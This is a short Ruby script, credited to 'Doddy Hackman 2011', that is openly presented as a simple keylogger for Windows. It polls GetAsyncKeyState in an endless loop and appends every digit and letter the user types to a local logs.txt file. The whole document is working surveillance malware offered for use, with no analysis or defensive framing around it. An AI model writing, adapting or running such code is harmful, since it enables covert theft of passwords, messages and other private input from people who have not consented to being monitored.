#!usr/bin/ruby
#Simple Keylogger in Ruby
#(C) Doddy Hackman 2011
 
require 'Win32API'
 
def savefile(filename,text)
files = File.open(filename,'a')
files.puts text+"\n"
end
 
def capturar
 
nave = Win32API.new("user32","GetAsyncKeyState",["i"],"i")
 
while 1
 
for num1 in (0x30..0x39) #numbers
if nave.call(num1) & 0x01 == 1 
savefile("logs.txt",num1.chr())
end
end
 
for num2 in (0x41..0x5A) #letters
if nave.call(num2) & 0x01 == 1 
savefile("logs.txt",num2.chr())
end
end
end	
end
 
capturar() #Start the keylogger
 
# ¿ The End ?